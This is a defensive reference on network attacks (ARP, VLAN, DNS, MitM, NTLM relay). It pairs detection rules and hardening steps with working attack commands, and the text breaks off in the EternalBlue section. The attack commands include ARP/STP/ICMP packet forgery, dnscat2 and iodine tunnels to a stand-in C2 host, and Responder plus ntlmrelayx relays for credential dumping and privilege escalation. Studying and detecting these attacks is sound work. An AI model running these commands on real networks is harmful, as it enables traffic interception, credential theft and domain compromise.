# Network Attacks Reference

**Audience:** Network security engineers, incident responders, SOC analysts  
**Perspective:** Defensive — attack mechanics explained to enable detection and prevention  
**Last updated:** 2026-05  

---

## Table of Contents

1. [Network Attack Taxonomy & Threat Landscape](#1-network-attack-taxonomy--threat-landscape)
2. [ARP & Layer 2 Attacks](#2-arp--layer-2-attacks)
3. [DNS Attacks](#3-dns-attacks)
4. [Man-in-the-Middle Attacks](#4-man-in-the-middle-attacks)
5. [SMB & Windows Network Attacks](#5-smb--windows-network-attacks)
6. [DoS & DDoS Attacks](#6-dos--ddos-attacks)
7. [BGP & Routing Attacks](#7-bgp--routing-attacks)
8. [Wireless Network Attacks](#8-wireless-network-attacks)
9. [Protocol-Specific Attacks](#9-protocol-specific-attacks)
10. [Network Attack Detection & Hunting](#10-network-attack-detection--hunting)

---

## 1. Network Attack Taxonomy & Threat Landscape

### OSI Model Attack Layer Mapping

Understanding which OSI layer an attack targets guides both detection placement and mitigation strategy:

| OSI Layer | Layer Name | Attack Examples | Detection Point |
|-----------|------------|-----------------|-----------------|
| Layer 1 | Physical | Cable tapping, fiber optical splicing, RF jamming | Physical security audits, optical power monitors |
| Layer 2 | Data Link | ARP spoofing, VLAN hopping, CAM flooding, STP attacks | Switch DAI, port security, BPDU Guard |
| Layer 3 | Network | IP spoofing, BGP hijacking, ICMP redirect, route injection | RPKI, BCP38, uRPF, ACL |
| Layer 4 | Transport | SYN flood, TCP session hijacking, port scanning | SYN cookies, stateful firewall, IDS signatures |
| Layer 5 | Session | SSL stripping, session fixation, SMB relay | TLS enforcement, HSTS, EPA |
| Layer 6 | Presentation | SSL/TLS downgrade, cipher suite exploitation | TLS policy enforcement, certificate monitoring |
| Layer 7 | Application | HTTP flood, DNS poisoning, SQL injection, SSRF | WAF, app-layer IDS, RASP |

Defenders should deploy controls at multiple layers — an attacker who defeats Layer 3 controls may still be caught by Layer 7 monitoring.

### Network Attack Categories

**Reconnaissance**  
Attackers map target networks before exploitation. Passive recon uses publicly available data (WHOIS, BGP tables, Shodan, certificate transparency logs). Active recon generates traffic: ICMP sweeps, SYN scans, UDP probes, OS fingerprinting via TCP/IP stack behavior. Detection: anomalous scan rates, sequential port access patterns, scanning from cloud exit nodes, use of known scanning ASNs.

**Interception / Man-in-the-Middle (MitM)**  
Traffic is captured or redirected through an attacker-controlled node. Requires either Layer 2 position (ARP spoof, rogue switch) or Layer 3 position (BGP hijack, ICMP redirect). SSL stripping degrades encrypted sessions. Detection: certificate anomalies, flow asymmetry, duplicate MAC/IP entries.

**Injection / Spoofing**  
Forged packets or protocol messages alter the network state. Examples: ARP reply injection, DNS response spoofing, BGP route injection, TCP RST injection. Detection: protocol validation (DNSSEC, RPKI, TCP MD5), rate anomalies, source validation.

**Flooding / Denial-of-Service**  
Resource exhaustion at bandwidth, connection-state, or application layers. Volumetric floods consume bandwidth; protocol attacks exhaust TCP state tables or CPU; application floods exhaust server threads. Detection: baseline deviation, flow analysis, scrubbing.

**Protocol Exploitation**  
Abuse of legitimate protocol features: LLMNR/NBT-NS for credential relay, DHCPv6 for MitM, Kerberos delegation for privilege escalation. Detection: disabling legacy protocols, protocol-specific alerting, anomaly detection.

**Lateral Movement**  
After initial access, attackers move through the network using SMB, RDP, WMI, SSH, or pass-the-hash/ticket techniques. Detection: east-west traffic monitoring, unusual authentication patterns, privileged account lateral logins.

### MITRE ATT&CK Network-Based Techniques

| Technique ID | Name | Defender Priority |
|---|---|---|
| T1595 | Active Scanning | Block scan sources, alert on port sweep patterns |
| T1018 | Remote System Discovery | Alert on nmap/ping sweeps from internal hosts |
| T1040 | Network Sniffing | Detect promiscuous mode NICs, alert on capture tool processes |
| T1046 | Network Service Discovery | Alert on internal service enumeration (masscan, nmap) |
| T1557 | Adversary-in-the-Middle | DAI, certificate monitoring, HSTS, flow asymmetry |
| T1498 | Network Denial of Service | Baseline + threshold alerting, BPF Flowspec, scrubbing |
| T1499 | Endpoint Denial of Service | App-layer rate limiting, WAF |
| T1565.002 | Data Manipulation: Transmitted Data | TLS enforcement, HMAC validation |
| T1090 | Proxy | Alert on unexpected proxy configurations, WPAD abuse |
| T1219 | Remote Access Software | Whitelist approved tools, alert on unauthorized tunneling |

### Attack Surface Inventory

**Exposed Services:** Internet-facing services represent primary attack surface. Inventory should include: TCP/UDP port map per host, service version and patch level, protocol security configuration (TLS versions, cipher suites, authentication method), authentication exposure (password vs certificate vs MFA), and network path (direct exposure vs reverse proxy vs WAF).

**Routing Infrastructure:** BGP speakers, route reflectors, OSPF/EIGRP domains, and management interfaces (SNMP, NETCONF, SSH) all represent attack surface. Router OS vulnerabilities (Cisco IOS XE CVE-2023-20198, CVE-2023-20273) are actively exploited. Segment management networks; enforce authentication on routing protocols.

**Wireless Infrastructure:** SSIDs, BSSIDs, channel allocation, authentication mode (WPA2/WPA3, PSK/Enterprise), RADIUS server configuration, rogue AP exposure.

### Network Kill Chain Stages

1. **Reconnaissance** — Passive (OSINT, BGP looking glasses, Shodan) and active (port scans, service probes, DNS enumeration)
2. **Weaponization** — Select tools for target environment (Responder for Windows/AD, PMKID attack for WPA2)
3. **Delivery** — Position attacker on network segment (physical access, compromised endpoint, rogue AP, cloud pivot)
4. **Exploitation** — Execute protocol attack (ARP spoof, NTLM relay, BGP prefix injection)
5. **Installation** — Establish persistence (rogue DHCP server, SSID implant, BGP session manipulation)
6. **Command & Control** — Use tunneling or covert channels (DNS tunneling, ICMP C2, HTTPS to bulletproof hosting)
7. **Actions on Objectives** — Credential harvest, data exfiltration, lateral movement, disruption

### Threat Actors Known for Network Attacks

**Nation-State APTs — BGP Hijacking:**  
- Rostelecom (AS12389) — 2020 BGP route leak affecting financial institutions, Google, Amazon  
- China Telecom — documented BGP misdirection incidents routing North American traffic through China (2010, 2019)  
- APT groups (Volt Typhoon, APT41) pre-position in ISP/edge infrastructure for traffic interception  

**Ransomware Groups — SMB Relay:**  
- Conti, BlackCat/ALPHV, LockBit — all use Responder + ntlmrelayx as standard lateral movement tools post-initial-access  
- Ryuk precursor TrickBot used network scanning (mass-scan module) to identify SMB targets  

**Hacktivists/Criminal Groups — DDoS:**  
- Killnet (Russian hacktivist) — primarily L7 HTTP floods against critical infrastructure  
- Anonymous Sudan — used Cloudflare-bypassing DDoS techniques against Microsoft, Dyn  
- Mirai botnet descendants (Moobot, Mantis) generate volumetric amplification attacks  

---

## 2. ARP & Layer 2 Attacks

### ARP Protocol Review

Address Resolution Protocol (ARP) maps IPv4 addresses to MAC addresses within a Layer 2 broadcast domain. ARP is stateless and unauthenticated — hosts accept ARP replies even without having sent a request.

**Gratuitous ARP:** A host broadcasts an ARP reply with its own IP/MAC mapping, used for IP conflict detection or to update ARP caches after interface changes. Attackers abuse this as it causes hosts to update their ARP tables immediately.

**ARP Table (Cache):** Each host and router maintains an ARP cache. Entries have a TTL (typically 60-300 seconds on Linux/Windows). Attackers must continually re-send forged ARPs to maintain poisoning since legitimate ARP traffic will eventually overwrite entries.

**Viewing ARP tables:**
```
# Linux/macOS
arp -a
ip neigh show

# Windows
arp -a

# Cisco IOS
show arp
show ip arp 192.168.1.0 255.255.255.0
```

### ARP Spoofing / Poisoning Mechanics

The attacker sends unsolicited ARP replies claiming that the gateway's IP address maps to the attacker's MAC address (and optionally vice versa). All hosts in the segment update their ARP caches; traffic destined for the gateway now flows to the attacker.

**Step-by-step:**
1. Attacker connects to LAN segment (physical, wireless, or via compromised host)
2. Attacker sends gratuitous ARP: `gateway IP → attacker MAC` to all hosts (broadcast)
3. Simultaneously sends ARP: `victim IP → attacker MAC` to the gateway
4. Attacker enables IP forwarding to relay traffic transparently
5. All victim↔gateway traffic passes through attacker

**Tools:**

```bash
# arpspoof (dsniff suite)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1   # poison victim toward gateway
# -t target, -r also poison gateway toward target (bidirectional)

# bettercap
bettercap -iface eth0
# In bettercap shell:
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on

# ettercap (GUI or CLI)
ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# Scapy — forge ARP reply
from scapy.all import *
# Tell 192.168.1.100 that 192.168.1.1 is at attacker MAC
pkt = ARP(op=2, pdst="192.168.1.100", psrc="192.168.1.1",
          hwdst="aa:bb:cc:dd:ee:ff",  # victim MAC
          hwsrc="de:ad:be:ef:00:01")  # attacker MAC
sendp(Ether(dst="aa:bb:cc:dd:ee:ff")/pkt, iface="eth0", loop=1, inter=2)
```

### Detection: Dynamic ARP Inspection (DAI)

DAI is a Cisco IOS / NX-OS switch feature that validates ARP packets against a DHCP snooping binding table. ARP packets with MAC/IP pairs not in the binding table are dropped.

```
# Cisco IOS — enable DAI per VLAN
ip arp inspection vlan 10,20
ip arp inspection vlan 10,20 logging acl-match acl-permit

# Mark trusted ports (uplinks, static hosts)
interface GigabitEthernet0/1
 ip arp inspection trust

# Rate-limit ARP on untrusted ports
interface GigabitEthernet0/2
 ip arp inspection limit rate 100 burst interval 1

# Verify
show ip arp inspection vlan 10
show ip arp inspection statistics vlan 10
```

**arpwatch:** Linux daemon that monitors ARP traffic and alerts on new MAC/IP pairs, MAC address flips, and IP reuse.
```bash
arpwatch -i eth0 -f /var/lib/arpwatch/arp.dat -m security@company.com
# Logs to syslog; alerts on "flip flop" (MAC change for existing IP) and "new activity"
```

**XDR/NDR alerts to configure:**
- Duplicate IP with different MAC (ARP spoofing indicator)
- Rapid ARP reply rate from single source (poisoning campaign)
- ARP reply without preceding request from same host
- Windows Event ID 4625 (logon failure) from unexpected source IPs after ARP change

### VLAN Hopping

**Double Tagging:** Attacker on native VLAN sends frames with two 802.1Q headers. The first switch strips the outer tag (native VLAN), and the inner tag (target VLAN) causes the frame to be forwarded to a different VLAN. Unidirectional — attacker cannot receive replies directly.

**Switch Spoofing (DTP Abuse):** 802.1Q Dynamic Trunking Protocol (DTP) allows switches to auto-negotiate trunk mode. An attacker sends DTP frames to establish a trunk, gaining access to all VLANs.

```
# Prevention: disable DTP on all access ports
interface range GigabitEthernet0/1-24
 switchport mode access          # explicitly set to access mode
 switchport nonegotiate          # disable DTP
 switchport access vlan 10

# Change native VLAN to unused VLAN (not VLAN 1)
interface GigabitEthernet0/25   # trunk uplink
 switchport trunk native vlan 999
 switchport trunk allowed vlan 10,20,30  # explicit whitelist

# Prune VLAN 1 from all trunks
switchport trunk allowed vlan remove 1
```

### CAM Table Flooding

The Content Addressable Memory (CAM) table maps MAC addresses to switch ports. Flooding the CAM table with thousands of forged MAC addresses fills it, causing the switch to fail open (flood all frames to all ports like a hub).

```bash
# macof tool (dsniff suite) — generate random MAC flood
macof -i eth0 -n 10000

# Detection: monitor CAM table utilization
show mac address-table count
show mac address-table aging-time

# Prevention: port security
interface GigabitEthernet0/2
 switchport port-security maximum 5           # max MACs per port
 switchport port-security violation restrict  # or shutdown/protect
 switchport port-security aging time 5        # age out in 5 min
 switchport port-security
```

### STP Attacks — BPDU Spoofing

Spanning Tree Protocol (STP) prevents loops by electing a root bridge and blocking redundant paths. The root bridge is determined by lowest Bridge ID (priority + MAC). An attacker sending superior BPDU frames (lower bridge priority) can become root bridge, causing traffic to flow through the attacker's port.

```bash
# Attack: send superior BPDU with Scapy
from scapy.all import *
bpdu = Dot3(dst="01:80:c2:00:00:00", src="de:ad:be:ef:00:01") / \
       LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
       STP(rootid=0, rootmac="de:ad:be:ef:00:01",
           bridgeid=0, bridgemac="de:ad:be:ef:00:01")
sendp(bpdu, iface="eth0", loop=1, inter=2)

# Prevention: BPDU Guard — shuts port if BPDU received on access port
interface range GigabitEthernet0/1-24
 spanning-tree bpduguard enable
 spanning-tree portfast

# Root Guard — prevents port from becoming root bridge
interface GigabitEthernet0/25
 spanning-tree guard root

# Global BPDU Guard
spanning-tree portfast bpduguard default
```

### MAC Address Spoofing Detection

Attackers spoof MAC addresses to bypass port security or impersonate a legitimate device.

```bash
# Linux — change MAC
ip link set dev eth0 down
ip link set dev eth0 address de:ad:be:ef:00:01
ip link set dev eth0 up

# Detection on switch
show mac address-table dynamic     # check for sudden MAC changes on a port
show interfaces GigabitEthernet0/2 | include Hardware  # physical MAC

# Suricata rule for ARP MAC mismatch (requires ARP logging)
# Monitor for MAC changes in NDR solution — ExtraHop, Darktrace, Corelight
```

---

## 3. DNS Attacks

### DNS Poisoning / Cache Poisoning

DNS cache poisoning injects a forged DNS response into a resolver's cache, causing victims to receive incorrect IP addresses for legitimate domain names.

**Kaminsky Attack (2008):** Dan Kaminsky discovered that DNS resolvers use predictable transaction IDs (16-bit, 65,536 values). An attacker floods the resolver with forged responses for a random subdomain of the target domain, guessing the transaction ID and source port. Success probability increases with response volume.

**Birthday Attack on Transaction IDs:** If an attacker can send enough forged responses before the legitimate authoritative server responds, they win the "race." Source port randomization (RFC 5452) significantly increases the attack space (16-bit TxID × 16-bit source port = 32-bit space, ~4 billion possibilities). DNSSEC eliminates the attack entirely via cryptographic response signing.

**Detection indicators:**
- High rate of outbound DNS queries from resolver to same authoritative server
- Response with TTL values inconsistent with legitimate records
- Multiple DNS responses for single query (response flooding)
- NXDOMAIN immediately followed by resolution of same name

### DNS Hijacking

**Router-level:** Compromised home routers have DNS settings changed to attacker-controlled resolvers. Victims' DNS queries return attacker-chosen IP addresses. Common in consumer IoT attacks.

**ISP-level:** Some ISPs intercept DNS queries for monetization (NXDOMAIN hijacking to ad pages). Malicious ISP employees or compromised ISP infrastructure can redirect traffic.

**BGP-hijacked Authoritative:** Attacker hijacks the BGP prefix of an authoritative DNS server (e.g., Amazon Route 53 prefix hijacked in 2018 to redirect MyEtherWallet traffic). Responses appear legitimate to resolvers.

**Prevention:**
- DNSSEC validation at recursive resolver
- DNS over HTTPS (DoH) / DNS over TLS (DoT) to prevent interception
- Certificate validation independent of DNS (certificate pinning, CT log monitoring)
- Monitor authoritative DNS BGP prefix with BGPmon/RIPE RIS

### DNS Tunneling

DNS tunneling encodes arbitrary data into DNS queries and responses, using the DNS protocol as a covert channel for C2 communication or data exfiltration. DNS traffic is often permitted even in restrictive environments.

**Protocols used:** TXT records (largest payload, 255 bytes per record), NULL records, CNAME records, A records (IPv4 encoding), AAAA records (IPv6 encoding).

**Tools:**
```bash
# dnscat2 — bidirectional DNS tunnel for C2
# Server (attacker controls authoritative NS for tunnel.evil.com)
ruby dnscat2.rb --dns "domain=tunnel.evil.com,host=0.0.0.0"

# Client (victim)
./dnscat2 tunnel.evil.com   # queries: <encoded_data>.tunnel.evil.com

# iodine — IP-over-DNS tunnel
# Server:
iodined -f 10.0.0.1 tunnel.evil.com   # assigns 10.0.0.1/24 to tunnel

# Client:
iodine -f -P password tunnel.evil.com  # creates dns0 interface with 10.0.0.2
```

**Detection methods:**

```
# Zeek dns.log analysis — high query rate to single domain
# Query frequency (>10 queries/second to same subdomain)
cat dns.log | zeek-cut query | sort | uniq -c | sort -rn | head -20

# FQDN length — tunneling uses long encoded subdomains
# Normal: avg FQDN < 40 chars; tunneling: avg FQDN > 100 chars
cat dns.log | zeek-cut query | awk '{print length, $0}' | sort -rn | head -20

# Subdomain entropy — encoded data has high Shannon entropy
# Python: calculate entropy of subdomain label
python3 -c "
import math, collections
def entropy(s):
    p = [float(s.count(c))/len(s) for c in set(s)]
    return -sum(x*math.log2(x) for x in p)
print(entropy('aGVsbG8gd29ybGQ'))  # base64 = high entropy ~4.0
print(entropy('www'))               # normal = low entropy ~1.5
"

# SPL query (Splunk) for DNS tunneling indicators
index=dns sourcetype=zeek_dns
| eval subdomain=mvindex(split(query,"."),0)
| eval subdomain_len=len(subdomain)
| eval domain=mvjoin(mvrange(1,mvcount(split(query,"."))),split(query,"."),".")
| stats count avg(subdomain_len) as avg_len dc(query) as unique_queries by domain
| where avg_len > 50 OR unique_queries > 100
| sort -avg_len
```

### DNS Amplification DDoS

An attacker sends DNS queries with a spoofed source IP (victim's IP) to open recursive resolvers. Large responses (DNS ANY, DNSSEC records) are sent to the victim. Amplification factor for DNS ANY: ~50x. Requires BCP38 compliance failure (allows IP spoofing).

```bash
# ANY query amplification example (for testing your own resolver only)
dig ANY isc.org @your-resolver-ip

# Detection: open resolver scan
nmap -sU -p 53 --script dns-recursion 192.168.0.0/24

# Prevention:
# 1. Disable open recursion on authoritative servers
# named.conf:
recursion no;
allow-query { any; };

# 2. Rate limiting on recursive resolvers (BIND rate-limit)
rate-limit {
    responses-per-second 15;
    window 5;
    log-only no;
};

# 3. Restrict recursion to internal clients only
allow-recursion { 10.0.0.0/8; 172.16.0.0/12; 192.168.0.0/16; };
```

### DNS Rebinding

DNS rebinding bypasses the browser same-origin policy (SOP). The attacker controls a domain that initially resolves to an external IP, then changes the DNS record to an internal IP (e.g., 192.168.1.1) with very short TTL (≤0 seconds). The victim browser makes requests to the "same origin" that now targets internal services.

**Impact:** Access to internal APIs, router admin panels, cloud metadata endpoints (169.254.169.254).

**Prevention:**
- DNS rebinding protection in resolvers: reject responses returning RFC1918 addresses for external queries
- Bind DNS server: `deny-answer-addresses { 192.168.0.0/16; 10.0.0.0/8; };`
- Application-layer: validate Host header, require authentication on internal services
- Use DNS over HTTPS (harder to intercept/block TTL manipulation)

### Fast Flux

**Single Flux:** A single domain has hundreds of A records that rotate rapidly (TTL 60-300s). Each rotation maps the domain to a different botnet node (proxy/bulletproof host). Makes takedown difficult.

**Double Flux:** Both the A records and the NS records rotate rapidly. The authoritative DNS servers are also botnet nodes, making attribution and takedown even harder. Used by Conficker, Necurs, and Emotet C2 infrastructure.

**Detection:**
```
# Zeek/Corelight detection of fast flux
# Indicators: short TTL + many A records + high IP churn
cat dns.log | zeek-cut query answers TTLs | grep -E "ttl.*[0-9]{1,2}$"

# Passive DNS — track IP count per domain over time
# Commercial: Farsight DNSDB, VirusTotal Passive DNS, RiskIQ

# SPL for fast flux detection
index=dns | eval ttl=mvindex(answer_ttl,0)
| where ttl < 300 AND isnotnull(answers)
| eval ip_count=mvcount(answers)
| where ip_count > 5
| stats dc(answers) as unique_ips by query span=1h
| where unique_ips > 10
```

### Zeek DNS Log Analysis

```bash
# /opt/zeek/logs/current/dns.log fields (selected):
# ts, uid, id.orig_h, id.resp_h, proto, query, qtype_name, rcode_name,
# answers, TTLs, rejected

# NXDOMAIN rate per client (DGA detection, beaconing)
cat dns.log | zeek-cut id.orig_h rcode_name | grep NXDOMAIN | \
  awk '{print $1}' | sort | uniq -c | sort -rn | head 20

# Unique domains queried per client (broad scanning)
cat dns.log | zeek-cut id.orig_h query | sort -u | \
  awk '{print $1}' | sort | uniq -c | sort -rn

# DNS over non-standard ports (port 53 bypass)
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto service | \
  awk '$3 != 53 && $5 == "dns"' | head -20
```

### DNSSEC, RPZ, and DoH/DoT

**DNSSEC:** Cryptographically signs DNS records. Validators check signatures; forged responses lack valid signatures. DNSSEC does not encrypt queries — only authenticates responses. Full chain: root → TLD → SLD. Resolver validation prevents cache poisoning. Deploy DNSSEC on authoritative zones; configure resolver to validate (BIND: `dnssec-validation auto;`).

**RPZ (Response Policy Zone):** Allows a resolver to override DNS responses based on a policy zone. Used for threat blocking (malware C2 domains, phishing domains). Feeds: Spamhaus RPZ, Infoblox TIDE, ISC DNSRPZ. Deploy: `response-policy { zone "rpz.threatfeed.com"; };` in named.conf.

**DoH/DoT:** Encrypt DNS traffic, preventing ISP-level interception and passive monitoring. Security tradeoff: DoH bypasses enterprise DNS security controls (RPZ, DLP via DNS). Enterprises should either intercept DoH (MITM on TCP/443 to known DoH providers) or block DoH providers (1.1.1.1, 8.8.8.8 port 443) and force internal resolver use.

---

## 4. Man-in-the-Middle Attacks

### Classic MitM Setup

A full MitM attack typically combines several primitives:
1. **Layer 2 positioning:** ARP spoofing (see Section 2) places attacker between victim and gateway
2. **IP forwarding:** Enable to relay traffic transparently
3. **Protocol downgrade:** SSL stripping degrades HTTPS to HTTP

```bash
# Complete MitM toolkit with bettercap
bettercap -iface eth0 -eval "
  set arp.spoof.targets 192.168.1.50;
  set arp.spoof.fullduplex true;
  arp.spoof on;
  set net.sniff.verbose false;
  net.sniff on;
  set http.proxy.sslstrip true;
  http.proxy on"
```

### SSL Stripping

SSL stripping (Moxie Marlinspike, 2009) downgrades HTTPS connections to HTTP. The attacker sits between victim and server, maintaining HTTPS to the server but serving HTTP to the victim. The victim sees HTTP, the server believes it has a legitimate HTTPS session with the client.

**sslstrip operation:**
```
Victim → [HTTP request] → Attacker → [HTTPS request] → Server
Victim ← [HTTP response] ← Attacker ← [HTTPS response] ← Server
(Attacker rewrites all https:// links to http:// in responses)
```

**HSTS (HTTP Strict Transport Security):** Instructs browsers to only connect via HTTPS for a specified period. If previously visited via HTTPS, the browser refuses HTTP. sslstrip is defeated if HSTS header was previously received.

**HSTS Preload:** Browsers ship with a hardcoded list of domains that must always use HTTPS (Chrome, Firefox preload list). Cannot be stripped regardless of whether victim has visited before.

**HSTS bypass limitations:** sslstrip2 / bettercap attempt to bypass HSTS by serving a lookalike domain (e.g., `www.paypa1.com` for `www.paypal.com`). This fails against certificate warnings.

**Detection:**
```
# IDS signature for SSL stripping (Suricata)
alert http any any -> any any (msg:"Possible SSL Strip - HTTP with downgraded security";
  content:"Set-Cookie"; http_header;
  content:!"Secure"; http_header;
  content:!"https://"; http_uri;
  flow:established,to_client;
  threshold: type limit, track by_src, count 10, seconds 60;
  sid:9000001; rev:1;)

# Monitor for HTTP requests to expected HTTPS sites
# Zeek http.log
cat http.log | zeek-cut id.orig_h host method | \
  awk '{if($2 ~ /bank|paypal|gmail|amazon/) print}' | head -20
```

### SSL/TLS Interception with mitmproxy

mitmproxy operates as a transparent or explicit proxy, generating per-site certificates signed by its own CA. If the attacker's CA is trusted by the victim (e.g., enterprise deployment or compromised root store), TLS is fully transparent to the attacker.

```bash
# Transparent mode (requires iptables redirect)
mitmproxy --mode transparent --listen-host 0.0.0.0 --listen-port 8080

# iptables redirect (on attacker/gateway)
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Certificate pinning detection/bypass attempts:
# Tools like objection (Frida-based) bypass pinning in mobile apps
# Enterprise SSL inspection: deploy CA cert via MDM/GPO

# Detection: Certificate transparency log monitoring
# Every certificate issued is logged to CT logs
# Monitor for unauthorized certs for your domains:
# Tools: cert.sh, Facebook CT monitor, Google Certificate Transparency
curl "https://crt.sh/?q=%.yourdomain.com&output=json" | \
  python3 -c "import json,sys; [print(c['common_name'],c['not_before']) for c in json.load(sys.stdin)]"
```

### BGP-Based MitM

The most powerful MitM technique: hijack the BGP prefix of the target's IP range, causing all internet traffic destined for the target to route through attacker-controlled infrastructure.

**2018 Amazon Route 53 BGP Hijack:** Attackers hijacked 48 /24 prefixes belonging to Amazon's DNS infrastructure. DNS queries for MyEtherWallet.com were answered by attacker-controlled server with a certificate from a less-trusted CA; victims' Ethereum was stolen.

**Traffic interception technique:** Announce a more-specific prefix (/25 vs /24). ISPs prefer more-specific routes. Attacker receives traffic, reads/modifies it, and forwards to the legitimate destination (maintaining BGP sessions with both the victim network and upstream transit).

**Prevention:**
- RPKI (see Section 7) — route origin validation prevents hijack of your own prefixes
- Monitor your own BGP announcements (BGPmon, Cloudflare Radar)
- Deploy certificate transparency monitoring — attacker-issued certs will appear

### ICMP Redirect Attacks

ICMP Redirect (Type 5) messages inform hosts of a better route to a destination. An attacker on the local network can send forged ICMP Redirect messages, changing a victim's routing table to route traffic through the attacker.

```bash
# Forge ICMP redirect with Scapy
from scapy.all import *
# Tell victim 192.168.1.50 to route traffic for 8.8.8.8 via attacker 192.168.1.99
pkt = IP(src="192.168.1.1", dst="192.168.1.50") / \
      ICMP(type=5, code=1, gw="192.168.1.99") / \
      IP(src="192.168.1.50", dst="8.8.8.8") / \
      UDP()
send(pkt)

# Prevention:
# Linux — disable ICMP redirect acceptance
sysctl -w net.ipv4.conf.all.accept_redirects=0
sysctl -w net.ipv4.conf.all.secure_redirects=0
echo "net.ipv4.conf.all.accept_redirects=0" >> /etc/sysctl.conf
```

### WPAD Abuse

Web Proxy Auto-Detection (WPAD) allows browsers to automatically discover proxy configuration. Browsers request `http://wpad/wpad.dat` or use DHCP option 252. Attackers can:
- Respond to WPAD DNS queries (if DNS suffixes include the attacker's domain)
- Use LLMNR/NBT-NS to answer `wpad` name queries (like Responder)
- Create a rogue DHCP server with WPAD option

**Prevention:**
```
# Disable WPAD via Group Policy
# Computer Configuration → Administrative Templates → Windows Components → Internet Explorer
# → Disable: Prevent the use of automatic proxy configuration scripts

# Block WPAD DNS resolution — create internal DNS record for wpad pointing to localhost
# or block in DNS firewall
nslookup wpad   # should not resolve externally

# Registry disable (Windows):
# HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad
# Set WpadOverride = 1
```

### MitM Detection Summary

| Indicator | Detection Method | Tool/Source |
|---|---|---|
| ARP cache change | DAI, arpwatch, NDR | Switch, arpwatch daemon |
| Unexpected CA in cert chain | Certificate CT log monitoring, browser warnings | crt.sh, Google CT |
| HTTP for HTTPS-expected domain | Zeek http.log analysis, HSTS enforcement | Zeek, Browser |
| Flow asymmetry | NDR analysis of session pairs | ExtraHop, Darktrace |
| ICMP redirect received | Host-level ICMP redirect logging | syslog, auditd |
| Duplicate SSL cert | Certificate fingerprint monitoring | Corelight ssl.log |

---

## 5. SMB & Windows Network Attacks

### NTLM Relay Attack Chain

NTLM relay is one of the most impactful network attacks in Active Directory environments. The attacker does not need to crack NTLM hashes — they relay the authentication in real-time to a target service.

**Full attack chain:**

**Step 1: LLMNR/NBT-NS Poisoning with Responder**

When a Windows host attempts to resolve a name not found in DNS (typo, non-existent host), it falls back to LLMNR (Link-Local Multicast Name Resolution, UDP/5355) and NBT-NS (NetBIOS Name Service, UDP/137). Responder answers these multicast queries with the attacker's IP, triggering authentication.

```bash
# Responder — poison LLMNR/NBT-NS, capture NTLM hashes
# /etc/responder/Responder.conf — disable SMB/HTTP to allow relay (not capture)
[Responder Core]
SMB = Off
HTTP = Off

responder -I eth0 -rdwP   # -r enable answers for rdp, -d enable answers for DHCP queries
# Logs to /usr/share/responder/logs/
```

**Step 2: Relay with ntlmrelayx.py**

```bash
# impacket ntlmrelayx.py — relay NTLM auth to targets
# Targets.txt: list of hosts where SMB signing is NOT required
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt   # find relay targets

# Basic SMB relay (dump SAM database if admin)
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP for RBCD attack (Resource-Based Constrained Delegation)
ntlmrelayx.py -tf targets.txt -smb2support -t ldap://dc01.corp.local \
  --delegate-access --escalate-user attacker-computer$

# Relay to LDAPS for adding domain admin
ntlmrelayx.py -t ldaps://dc01.corp.local --add-computer AttackPC --escalate-user AttackPC$

# Relay to HTTP (ADCS — ESC8 attack)
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp \
  --adcs --template DomainController
```

**Step 3: Post-relay actions**

Once relay succeeds, attacker has authenticated session:
- SAM dump via SMB (local admin credentials)
- LDAP query for AD information
- Certificate request via ADCS for persistent access
- RBCD to allow controlled Kerberos impersonation

### Responder Detection

**Windows Event IDs:**
- **4648** — A logon was attempted using explicit credentials (unusual source)
- **4624 Type 3** — Network logon — unexpected source IP for service accounts
- **4625** — Failed logon (if relay fails)
- **5145** — Network share access (SMB access from unexpected host)

**Microsoft Defender for Identity (MDI) / Sentinel analytics:**
```kql
// Detect LLMNR/NBNS poisoning via MDI alert
SecurityAlert
| where AlertName contains "LLMNR/NBNS Poisoning"
| project TimeGenerated, AlertSeverity, Entities, ExtendedProperties

// Multiple type 3 logons from single source to multiple targets
SecurityEvent
| where EventID == 4624 and LogonType == 3
| summarize target_count=dcount(Computer), targets=make_set(Computer) by Account, IpAddress, bin(TimeGenerated, 5m)
| where target_count > 3
| sort by target_count desc
```

**Prevention:**
```
# Group Policy: Disable LLMNR
# Computer Configuration → Administrative Templates → Network → DNS Client
# → Turn off multicast name resolution: Enabled

# Disable NBT-NS via PowerShell on all adapters
Get-WmiObject Win32_NetworkAdapterConfiguration | 
  ForEach-Object { $_.SetTcpipNetbios(2) }   # 2 = disable NetBIOS

# Enable SMB signing (prevents relay, traffic still intercepted but not usable)
# GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies
# → Security Options → Microsoft network server: Digitally sign communications (always)
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force

# Extended Protection for Authentication (EPA) — binds NTLM to TLS channel
# Required on IIS/Exchange/ADCS to prevent HTTP relay
```

### SMB Enumeration

```bash
# nmap SMB enumeration scripts
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery \
  --script-args smbuser=username,smbpass=password 192.168.1.0/24

# enum4linux-ng (Python rewrite of enum4linux)
enum4linux-ng -A -u username -p password 192.168.1.50

# CrackMapExec (now NetExec)
nxc smb 192.168.1.0/24 -u username -p password --shares
nxc smb 192.168.1.0/24 -u username -p password --users
nxc smb 192.168.1.0/24 -u '' -p '' --shares   # null session

# Detection: Windows Event ID 5145 — network share object access
# Alert on: anonymous access to IPC$, access from unusual hosts/users
```

### EternalBlue (CVE-2017-0144)

EternalBlue exploits a buffer overflow in SMBv1 (Windows 7 / Server 2008 and earlier). Used by WannaCry ransomware (2017) and NotPetya. Patches: MS17-010.

```bash
# Detection: Suricata/Snort signatures
# ET EXPLOIT Possible ETERNALBLUE MS17-010 Echo Response
